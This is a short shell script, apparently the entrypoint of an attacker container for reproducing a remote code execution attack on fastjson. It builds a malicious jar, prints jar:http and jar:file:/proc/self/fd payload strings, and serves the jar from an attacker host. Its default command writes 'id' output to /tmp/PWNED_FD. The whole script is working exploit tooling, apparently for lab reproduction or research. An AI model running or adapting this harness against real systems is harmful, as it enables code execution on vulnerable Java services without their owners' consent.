#!/bin/sh
set -e

HOST="${ATTACKER_FD_HOST:-attacker-fd}"
PORT="${ATTACKER_FD_PORT:-8001}"
PATH_PART="${ATTACKER_FD_PATH:-x}"
FD_START="${FD_START:-3}"
FD_END="${FD_END:-64}"
CMD="${PWN_FD_CMD:-id >> /tmp/PWNED_FD 2>&1; echo RCE_via_fastjson_FD_JSONType >> /tmp/PWNED_FD}"

mkdir -p /www /build
java -cp "/opt/asm.jar:/opt" GenFd "${HOST}" "${PORT}" "${PATH_PART}" "${FD_START}" "${FD_END}" /www/x "$CMD"

echo "[attacker-fd] malicious FD-chain jar ready"
echo "[attacker-fd] first payload type: jar:http:..${HOST}:${PORT}.${PATH_PART}!.foo.Exception"
echo "[attacker-fd] fd payload range: jar:file:.proc.self.fd.${FD_START}!.fd${FD_START}.Exception ... fd${FD_END}"
exec java -Dport="${PORT}" -Dfile=/www/x -cp /opt AttackerFdServer
